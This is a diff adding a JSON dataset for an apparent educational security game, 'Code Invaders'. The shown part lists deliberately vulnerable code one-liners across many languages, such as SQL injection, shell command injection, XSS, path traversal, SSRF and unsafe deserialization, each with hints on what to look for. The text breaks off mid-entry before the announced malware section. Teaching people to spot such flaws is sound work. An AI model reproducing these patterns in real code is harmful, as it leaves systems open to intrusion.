@@ -1,0 +1,2420 @@
+{
+  "meta": {
+    "name": "Code Invaders Trend Pack",
+    "generated_on": "2026-03-23",
+    "counts": {
+      "insecure": 150,
+      "malware": 150,
+      "total": 300
+    },
+    "notes": [
+      "Examples use placeholder domains like payload.invalid, c2.invalid, and exfil.invalid.",
+      "These are intentionally obvious for educational gameplay rather than fully realistic production code.",
+      "Focus areas were chosen from recent OWASP, MITRE CWE, CISA, and MITRE ATT&CK guidance."
+    ]
+  },
+  "insecure": [
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "JavaScript",
+      "snippet": "const sql = \"SELECT * FROM users WHERE id=\" + req.query.id",
+      "look_for": "string-built query; user input inside SQL",
+      "why_it_matters": "Classic SQL injection."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "TypeScript",
+      "snippet": "await db.query(`SELECT * FROM orders WHERE email = '${email}'`)",
+      "look_for": "template literal SQL; untrusted variable",
+      "why_it_matters": "Template interpolation into SQL."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "Python",
+      "snippet": "query = \"SELECT * FROM users WHERE name = '\" + username + \"'\"",
+      "look_for": "string concatenation into SQL",
+      "why_it_matters": "Unsafely joins attacker-controlled data."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "Python",
+      "snippet": "cursor.execute(f\"DELETE FROM sessions WHERE id = {session_id}\")",
+      "look_for": "f-string SQL",
+      "why_it_matters": "F-string used instead of parameters."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "PHP",
+      "snippet": "$sql = \"SELECT * FROM posts WHERE slug='\" . $_GET[\"slug\"] . \"'\";",
+      "look_for": "superglobal in query",
+      "why_it_matters": "Unsanitized request data in SQL."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "Ruby",
+      "snippet": "User.find_by_sql(\"SELECT * FROM accounts WHERE email = '#{params[:email]}'\")",
+      "look_for": "interpolation in SQL",
+      "why_it_matters": "Unsafe ActiveRecord raw SQL."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "Java",
+      "snippet": "String q = \"SELECT * FROM files WHERE path='\" + path + \"'\";",
+      "look_for": "string concatenation",
+      "why_it_matters": "Raw SQL string building."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "Go",
+      "snippet": "db.Query(\"SELECT * FROM users WHERE role = '\" + role + \"'\")",
+      "look_for": "concatenated SQL",
+      "why_it_matters": "Bypasses placeholders."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "JavaScript",
+      "snippet": "db.users.find({ \"$where\": \"this.name == '\" + name + \"'\" })",
+      "look_for": "Mongo $where with string code",
+      "why_it_matters": "NoSQL/code injection smell."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "Python",
+      "snippet": "collection.find({\"$where\": \"this.age == \" + age})",
+      "look_for": "Mongo $where; string expression",
+      "why_it_matters": "Server-side JS evaluation risk."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "JavaScript",
+      "snippet": "const filter = JSON.parse(req.query.filter); db.find(filter);",
+      "look_for": "user-controlled filter object",
+      "why_it_matters": "NoSQL operator injection."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "Python",
+      "snippet": "users.find_one(json.loads(request.args[\"query\"]))",
+      "look_for": "parsed JSON query from user",
+      "why_it_matters": "Lets attacker send operators like $ne."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "PHP",
+      "snippet": "$where = $_POST[\"where\"]; $db->query(\"SELECT * FROM t WHERE \" . $where);",
+      "look_for": "raw WHERE clause from user",
+      "why_it_matters": "Arbitrary condition injection."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "TypeScript",
+      "snippet": "const q = \"UPDATE inventory SET qty=\" + qty + \" WHERE sku='\" + sku + \"'\";",
+      "look_for": "multiple untrusted values in SQL",
+      "why_it_matters": "Easy injection surface."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: SQL/NoSQL",
+      "language": "Python",
+      "snippet": "sql = \"SELECT * FROM logs ORDER BY \" + request.args[\"sort\"]",
+      "look_for": "dynamic ORDER BY from input",
+      "why_it_matters": "Identifier injection even without quotes."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "JavaScript",
+      "snippet": "child_process.exec(\"ping \" + req.query.host)",
+      "look_for": "exec + concatenation",
+      "why_it_matters": "OS command injection."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "TypeScript",
+      "snippet": "execSync(`tar -czf backup.tgz ${folder}`)",
+      "look_for": "shell command template literal",
+      "why_it_matters": "Untrusted shell expansion."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "Python",
+      "snippet": "os.system(\"convert \" + filename + \" thumb.png\")",
+      "look_for": "os.system + input",
+      "why_it_matters": "Command execution via shell metacharacters."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "Python",
+      "snippet": "subprocess.run(\"grep \" + term + \" app.log\", shell=True)",
+      "look_for": "shell=True; concatenated string",
+      "why_it_matters": "Command injection and shell parsing."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "PHP",
+      "snippet": "system(\"rm -rf \" . $_POST[\"path\"]);",
+      "look_for": "system with request param",
+      "why_it_matters": "Deletes arbitrary paths or chains commands."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "Ruby",
+      "snippet": "`nslookup #{params[:domain]}`",
+      "look_for": "backticks with interpolation",
+      "why_it_matters": "Backticks invoke shell."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "Java",
+      "snippet": "Runtime.getRuntime().exec(\"sh -c \\\"cat \" + file + \"\\\"\")",
+      "look_for": "sh -c wrapper",
+      "why_it_matters": "Shell injection pattern."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "Go",
+      "snippet": "exec.Command(\"sh\", \"-c\", \"curl \" + url).Run()",
+      "look_for": "sh -c; string command",
+      "why_it_matters": "Escapes argument separation."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "JavaScript",
+      "snippet": "spawn(\"bash\", [\"-lc\", \"ffmpeg -i \" + input])",
+      "look_for": "bash -lc with string building",
+      "why_it_matters": "Turns safe API into unsafe shell."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "Python",
+      "snippet": "Popen(f\"tar xf {archive}\", shell=True)",
+      "look_for": "f-string + shell=True",
+      "why_it_matters": "Archive name can inject flags/commands."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "PHP",
+      "snippet": "shell_exec(\"git clone \" . $_GET[\"repo\"]);",
+      "look_for": "shell_exec + URL param",
+      "why_it_matters": "Downloads or executes unintended commands."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "JavaScript",
+      "snippet": "exec(\"node \" + req.body.script)",
+      "look_for": "exec + user path",
+      "why_it_matters": "Runs attacker-selected program."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "Python",
+      "snippet": "commands.getoutput(\"dig \" + domain)",
+      "look_for": "shell helper with concatenation",
+      "why_it_matters": "Deprecated helper often unsafe."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "Ruby",
+      "snippet": "system(\"python3 \" + params[:tool])",
+      "look_for": "system string form",
+      "why_it_matters": "Attacker can append shell ops."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: Command",
+      "language": "Java",
+      "snippet": "new ProcessBuilder(\"bash\",\"-lc\",\"find \" + dir).start();",
+      "look_for": "bash -lc in ProcessBuilder",
+      "why_it_matters": "Still shell injection."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "JavaScript",
+      "snippet": "commentEl.innerHTML = req.body.comment",
+      "look_for": "innerHTML from request",
+      "why_it_matters": "Stored/reflected XSS."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "TypeScript",
+      "snippet": "res.send(`<h1>Hello ${name}</h1>`)",
+      "look_for": "HTML template with user data",
+      "why_it_matters": "Server-side HTML injection."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "JavaScript",
+      "snippet": "document.write(location.hash.slice(1))",
+      "look_for": "document.write; location data",
+      "why_it_matters": "DOM XSS sink."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "JavaScript",
+      "snippet": "profile.innerHTML = user.bio",
+      "look_for": "unsafe DOM sink",
+      "why_it_matters": "Direct injection into page."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "PHP",
+      "snippet": "echo \"<div>\" . $_GET[\"msg\"] . \"</div>\";",
+      "look_for": "echoing request into HTML",
+      "why_it_matters": "Unescaped output."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "Python",
+      "snippet": "return f\"<p>{request.args['q']}</p>\"",
+      "look_for": "f-string HTML output",
+      "why_it_matters": "Reflects attacker input."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "Ruby",
+      "snippet": "\"<div>#{params[:note]}</div>\".html_safe",
+      "look_for": "html_safe + interpolation",
+      "why_it_matters": "Bypasses escaping."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "JavaScript",
+      "snippet": "el.outerHTML = `<section>${payload}</section>`",
+      "look_for": "outerHTML sink",
+      "why_it_matters": "Replaces DOM with attacker HTML."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "TypeScript",
+      "snippet": "dangerouslySetInnerHTML={{ __html: data.body }}",
+      "look_for": "dangerouslySetInnerHTML",
+      "why_it_matters": "React escape hatch misuse."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "Java",
+      "snippet": "model.addAttribute(\"raw\", input); return \"rawView\";",
+      "look_for": "raw template injection context",
+      "why_it_matters": "Depends on template escaping; risky if unescaped."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "JavaScript",
+      "snippet": "setTimeout(userCode, 0)",
+      "look_for": "string/code execution from user",
+      "why_it_matters": "DOM-based code injection smell."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "PHP",
+      "snippet": "printf($_GET[\"format\"], $value);",
+      "look_for": "format string from user",
+      "why_it_matters": "Can produce unsafe HTML or other issues."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "Python",
+      "snippet": "Markup(user_input)",
+      "look_for": "marking untrusted input safe",
+      "why_it_matters": "Explicitly disables escaping."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "JavaScript",
+      "snippet": "iframe.srcdoc = req.body.html",
+      "look_for": "srcdoc from input",
+      "why_it_matters": "Runs attacker-controlled HTML/JS."
+    },
+    {
+      "type": "insecure",
+      "category": "Injection: XSS / Content Injection",
+      "language": "Ruby",
+      "snippet": "render inline: params[:template]",
+      "look_for": "user-controlled template",
+      "why_it_matters": "Server-side template injection."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "JavaScript",
+      "snippet": "fs.readFileSync(\"/uploads/\" + req.query.file)",
+      "look_for": "path concatenation",
+      "why_it_matters": "Directory traversal."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "Python",
+      "snippet": "open(\"/var/data/\" + request.args[\"name\"]).read()",
+      "look_for": "path from request",
+      "why_it_matters": "Can escape base directory."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "PHP",
+      "snippet": "include($_GET[\"page\"] . \".php\");",
+      "look_for": "dynamic include",
+      "why_it_matters": "Traversal/local file include risk."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "Ruby",
+      "snippet": "send_file(\"/exports/\" + params[:name])",
+      "look_for": "send_file with raw name",
+      "why_it_matters": "Can disclose arbitrary files."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "Java",
+      "snippet": "Files.readString(Paths.get(\"/reports/\" + fileName));",
+      "look_for": "raw fileName in path",
+      "why_it_matters": "Path traversal via ../"
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "Go",
+      "snippet": "http.ServeFile(w, r, \"./public/\" + r.URL.Query().Get(\"f\"))",
+      "look_for": "ServeFile concatenation",
+      "why_it_matters": "Files outside intended root."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "JavaScript",
+      "snippet": "const dest = \"uploads/\" + req.body.filename; fs.writeFileSync(dest, data)",
+      "look_for": "client-chosen filename",
+      "why_it_matters": "Overwrite or traverse."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "Python",
+      "snippet": "tar.extractall(\"/tmp/unpack\")",
+      "look_for": "archive extraction without validation",
+      "why_it_matters": "Zip Slip / archive traversal."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "Java",
+      "snippet": "new ZipFile(zip).extractAll(\"/tmp/out\");",
+      "look_for": "blind archive extraction",
+      "why_it_matters": "Archive entry path abuse."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "PHP",
+      "snippet": "move_uploaded_file($_FILES[\"f\"][\"tmp_name\"], \"uploads/\" . $_FILES[\"f\"][\"name\"]);",
+      "look_for": "trusting original filename",
+      "why_it_matters": "Traversal and overwrite."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "TypeScript",
+      "snippet": "app.use(\"/img\", express.static(req.query.root))",
+      "look_for": "user-controlled static root",
+      "why_it_matters": "Arbitrary file exposure."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "Python",
+      "snippet": "pickle.load(open(request.files[\"blob\"].filename,\"rb\"))",
+      "look_for": "filename from upload and pickle",
+      "why_it_matters": "Path + unsafe deserialization."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "Ruby",
+      "snippet": "YAML.load_file(params[:config])",
+      "look_for": "load file chosen by user",
+      "why_it_matters": "Traversal plus unsafe parser."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "JavaScript",
+      "snippet": "res.download(\"./docs/\" + req.params.path)",
+      "look_for": "download path concatenation",
+      "why_it_matters": "Direct object/path traversal."
+    },
+    {
+      "type": "insecure",
+      "category": "File Handling: Path Traversal / Unsafe Upload",
+      "language": "Go",
+      "snippet": "os.WriteFile(\"/tmp/\"+r.FormValue(\"name\"), body, 0644)",
+      "look_for": "write path from form field",
+      "why_it_matters": "Attacker controls destination."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "JavaScript",
+      "snippet": "await fetch(req.query.url)",
+      "look_for": "server fetches user URL",
+      "why_it_matters": "SSRF primitive."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "TypeScript",
+      "snippet": "axios.get(imageUrl)",
+      "look_for": "remote fetch from unvalidated input",
+      "why_it_matters": "May reach internal services."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "Python",
+      "snippet": "requests.get(request.args[\"url\"])",
+      "look_for": "requests.get on user URL",
+      "why_it_matters": "Can hit metadata endpoints."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "Go",
+      "snippet": "http.Get(r.URL.Query().Get(\"target\"))",
+      "look_for": "unvalidated outbound request",
+      "why_it_matters": "SSRF."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "Java",
+      "snippet": "new URL(url).openStream();",
+      "look_for": "URL.openStream from input",
+      "why_it_matters": "Blind fetch to attacker-chosen host."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "PHP",
+      "snippet": "file_get_contents($_GET[\"u\"]);",
+      "look_for": "remote read from user URL",
+      "why_it_matters": "Common SSRF sink."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "Ruby",
+      "snippet": "Net::HTTP.get(URI(params[:url]))",
+      "look_for": "unvalidated URL",
+      "why_it_matters": "Internal network reachable."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "JavaScript",
+      "snippet": "await fetch(\"http://\" + req.query.host + \"/health\")",
+      "look_for": "host concatenation",
+      "why_it_matters": "Attacker picks destination."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "Python",
+      "snippet": "urllib.request.urlopen(form[\"webhook\"])",
+      "look_for": "webhook URL accepted blindly",
+      "why_it_matters": "SSRF via webhook testing."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "TypeScript",
+      "snippet": "res.send(await got.post(callbackUrl, {json:data}).text())",
+      "look_for": "callback URL from request",
+      "why_it_matters": "Server-to-server pivot."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "Java",
+      "snippet": "restTemplate.getForObject(userSuppliedUrl, String.class);",
+      "look_for": "RestTemplate + user URL",
+      "why_it_matters": "Widely seen SSRF pattern."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "PHP",
+      "snippet": "curl_setopt($ch, CURLOPT_URL, $_POST[\"endpoint\"]);",
+      "look_for": "cURL URL from input",
+      "why_it_matters": "No allowlist."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "JavaScript",
+      "snippet": "const img = await fetch(req.body.avatarUrl)",
+      "look_for": "image proxy without validation",
+      "why_it_matters": "Image fetchers are classic SSRF paths."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "Python",
+      "snippet": "subprocess.run([\"curl\", url])",
+      "look_for": "curling user URL",
+      "why_it_matters": "Still SSRF, plus shell risk if stringified."
+    },
+    {
+      "type": "insecure",
+      "category": "Network: SSRF / Untrusted URL Fetch",
+      "language": "Go",
+      "snippet": "client.PostForm(callback, vals)",
+      "look_for": "callback/notify URL from user",
+      "why_it_matters": "Webhook SSRF."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "JavaScript",
+      "snippet": "app.get(\"/api/users/:id\", async (req,res)=>res.json(await db.user.findUnique({where:{id:req.params.id}})))",
+      "look_for": "object lookup by user-supplied id; no auth check",
+      "why_it_matters": "BOLA / IDOR."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "Python",
+      "snippet": "return Account.query.get(request.args[\"id\"]).to_dict()",
+      "look_for": "fetch-by-id without ownership check",
+      "why_it_matters": "Broken object-level authorization."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "TypeScript",
+      "snippet": "await prisma.user.update({ where:{id:req.body.id}, data:req.body })",
+      "look_for": "mass assignment; blind object update",
+      "why_it_matters": "Lets attacker set protected fields."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "Ruby",
+      "snippet": "user.update(params.require(:user).permit!)",
+      "look_for": "permit! on whole object",
+      "why_it_matters": "Mass assignment."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "PHP",
+      "snippet": "User::where(\"id\", $_POST[\"id\"])->update($_POST);",
+      "look_for": "full request applied to model",
+      "why_it_matters": "Privilege flags can be overwritten."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "Java",
+      "snippet": "if (req.isAuthenticated()) return repo.findById(id);",
+      "look_for": "auth only; no authorization",
+      "why_it_matters": "Logged-in is not enough."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "Go",
+      "snippet": "json.NewDecoder(r.Body).Decode(&user); db.Save(&user)",
+      "look_for": "direct bind then save",
+      "why_it_matters": "Mass assignment of admin/role fields."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "JavaScript",
+      "snippet": "const isAdmin = req.body.isAdmin;",
+      "look_for": "trusting client role field",
+      "why_it_matters": "Client controls authorization."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "Python",
+      "snippet": "profile = Profile.query.filter_by(id=id).first(); return jsonify(profile.as_dict())",
+      "look_for": "no tenant boundary check",
+      "why_it_matters": "Cross-account data access."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "TypeScript",
+      "snippet": "const project = await Project.findByPk(req.params.id); res.json(project)",
+      "look_for": "IDOR endpoint",
+      "why_it_matters": "Object returned without owner check."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "Ruby",
+      "snippet": "render json: Invoice.find(params[:id])",
+      "look_for": "find by id and render",
+      "why_it_matters": "Insecure direct object reference."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "PHP",
+      "snippet": "$user->role = $_POST[\"role\"]; $user->save();",
+      "look_for": "role taken from request",
+      "why_it_matters": "Privilege escalation."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "Java",
+      "snippet": "BeanUtils.populate(user, request.getParameterMap());",
+      "look_for": "automatic property binding",
+      "why_it_matters": "Setter abuse/mass assignment."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "Go",
+      "snippet": "if token.Valid { return getReport(reportID) }",
+      "look_for": "token valid but resource auth missing",
+      "why_it_matters": "Broken access control."
+    },
+    {
+      "type": "insecure",
+      "category": "Authorization: IDOR / Mass Assignment",
+      "language": "JavaScript",
+      "snippet": "const fields = req.body; await user.update(fields)",
+      "look_for": "unfiltered user fields",
+      "why_it_matters": "Lets players see suspicious full-object writes."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "JavaScript",
+      "snippet": "const apiKey = \"sk_live_REPLACE_ME\";",
+      "look_for": "hardcoded secret",
+      "why_it_matters": "Secret in source code."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "Python",
+      "snippet": "SECRET_KEY = \"super-secret-dev-key\"",
+      "look_for": "hardcoded secret",
+      "why_it_matters": "Hardcoded signing key."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "JavaScript",
+      "snippet": "if (user.password == inputPassword)",
+      "look_for": "plain equality on raw password",
+      "why_it_matters": "Likely plaintext password comparison."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "Python",
+      "snippet": "hashlib.md5(password.encode()).hexdigest()",
+      "look_for": "weak password hash",
+      "why_it_matters": "Fast, outdated hashing."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "PHP",
+      "snippet": "$token = base64_encode(json_encode($claims));",
+      "look_for": "unsigned token",
+      "why_it_matters": "Looks like JWT but lacks signature."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "Java",
+      "snippet": "String alg = \"DES\";",
+      "look_for": "obsolete crypto choice",
+      "why_it_matters": "Weak algorithm."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "Ruby",
+      "snippet": "OpenSSL::Cipher.new(\"rc4\")",
+      "look_for": "broken/obsolete cipher",
+      "why_it_matters": "Legacy crypto."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "TypeScript",
+      "snippet": "jwt.verify(token, \"secret\")",
+      "look_for": "shared literal secret",
+      "why_it_matters": "Weak secret handling."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "Python",
+      "snippet": "random.random().hex()",
+      "look_for": "non-crypto randomness",
+      "why_it_matters": "Predictable token generation."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "JavaScript",
+      "snippet": "localStorage.setItem(\"jwt\", token)",
+      "look_for": "long-lived token in localStorage",
+      "why_it_matters": "Easy theft via XSS."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "PHP",
+      "snippet": "setcookie(\"sid\", $sid, 0, \"/\", \"\", false, false);",
+      "look_for": "missing Secure/HttpOnly",
+      "why_it_matters": "Cookie theft risk."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "Java",
+      "snippet": "MessageDigest.getInstance(\"SHA-1\")",
+      "look_for": "weak digest",
+      "why_it_matters": "Collision-prone."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "Python",
+      "snippet": "ssl._create_unverified_context()",
+      "look_for": "TLS verification disabled",
+      "why_it_matters": "MITM exposure."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "JavaScript",
+      "snippet": "fetch(url, { headers: { Authorization: \"Basic \" + btoa(user+\":\"+pass) } })",
+      "look_for": "basic auth built from raw creds",
+      "why_it_matters": "Credential exposure smell."
+    },
+    {
+      "type": "insecure",
+      "category": "Crypto/Auth: Weak Secrets & Token Mistakes",
+      "language": "Go",
+      "snippet": "cfg.InsecureSkipVerify = true",
+      "look_for": "TLS validation disabled",
+      "why_it_matters": "Common obvious anti-pattern."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "JavaScript",
+      "snippet": "eval(req.body.expression)",
+      "look_for": "eval on input",
+      "why_it_matters": "Arbitrary code execution."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "Python",
+      "snippet": "pickle.loads(request.data)",
+      "look_for": "pickle on untrusted bytes",
+      "why_it_matters": "Unsafe deserialization."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "Ruby",
+      "snippet": "YAML.load(params[:payload])",
+      "look_for": "unsafe YAML load",
+      "why_it_matters": "Object instantiation gadgets."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "Java",
+      "snippet": "new ObjectInputStream(in).readObject();",
+      "look_for": "Java native deserialization",
+      "why_it_matters": "Classic RCE sink."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "PHP",
+      "snippet": "unserialize($_COOKIE[\"prefs\"]);",
+      "look_for": "unserialize on cookie",
+      "why_it_matters": "POP chains / object injection."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "TypeScript",
+      "snippet": "new Function(\"return \" + req.body.rule)()",
+      "look_for": "dynamic function creation",
+      "why_it_matters": "Code injection."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "Python",
+      "snippet": "exec(user_script)",
+      "look_for": "exec on input",
+      "why_it_matters": "Direct code execution."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "JavaScript",
+      "snippet": "require(req.query.module)",
+      "look_for": "dynamic require path",
+      "why_it_matters": "Loads attacker-chosen code/module."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "Go",
+      "snippet": "plugin.Open(r.URL.Query().Get(\"name\"))",
+      "look_for": "load plugin by user input",
+      "why_it_matters": "Dynamic code loading."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "PHP",
+      "snippet": "include($_POST[\"template\"]);",
+      "look_for": "include from request",
+      "why_it_matters": "Remote/local file inclusion."
+    },
+    {
+      "type": "insecure",
+      "category": "Integrity: Unsafe Deserialization / Dynamic Code",
+      "language": "Python",
